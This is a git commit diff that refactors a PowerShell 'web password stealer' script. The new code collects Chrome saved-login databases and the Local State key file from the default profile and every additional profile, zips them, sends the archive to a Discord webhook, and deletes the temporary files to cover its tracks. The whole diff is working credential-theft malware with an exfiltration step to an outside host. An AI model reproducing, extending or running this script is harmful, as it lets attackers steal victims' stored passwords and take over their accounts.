5ff63ff9fcc9f13a89e3c9dd2888c8ecd5924013
Cronix2 <clement.linossier@efrei.net>
2024-11-07 12:01:49 +0100

    Refactor web password stealer script to improve directory handling and support multiple Chrome profiles

--- web_pass.ps1
+++ web_pass.ps1
@@ -1,4 +1,4 @@
-$hookurl="$dc"
+$hookurl = "$dc"
 function Send-Discord {
     [CmdletBinding()]
     param(
@@ -22,14 +22,32 @@ function Send-Discord {
     }
 }
 
-$FolderName = "$env:USERNAME-PASSWORDS-$(get-date -f yyyy-MM-dd_hh-mm)"
+$FolderName = "$env:USERNAME-PASSWORDS-$(Get-Date -f yyyy-MM-dd_hh-mm)"
 $ZIP = "$FolderName.zip"
-New-Item -Path $env:tmp/$FolderName -ItemType Directory
+$DestinationPath = "$env:TEMP/$FolderName"
+New-Item -Path $DestinationPath -ItemType Directory
 
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination  $env:TEMP\$FolderName\LoginData
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination  $env:TEMP\$FolderName\LocalState
+# Récupère les informations de connexion pour le profil par défaut
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\LoginData_0"
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\LocalState"
 
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
+# Récupère les informations de connexion pour chaque profil "Profile*"
+$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
+$index = 1
+foreach ($profile in $profiles) {
+    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
+    if (Test-Path $loginDataPath) {
+        Copy-Item $loginDataPath -Destination "$DestinationPath\LoginData_$index"
+        $index++
+    }
+}
 
-Send-Discord -file $env:tmp/$ZIP
-Remove-Item $env:tmp/$ZIP
+# Compresse le dossier contenant les données
+Compress-Archive -Path $DestinationPath -DestinationPath "$env:TEMP/$ZIP"
+
+# Envoie le fichier ZIP
+Send-Discord -file "$env:TEMP/$ZIP"
+
+# Nettoie les fichiers temporaires
+Remove-Item "$env:TEMP/$ZIP"
+Remove-Item -Recurse -Force $DestinationPath
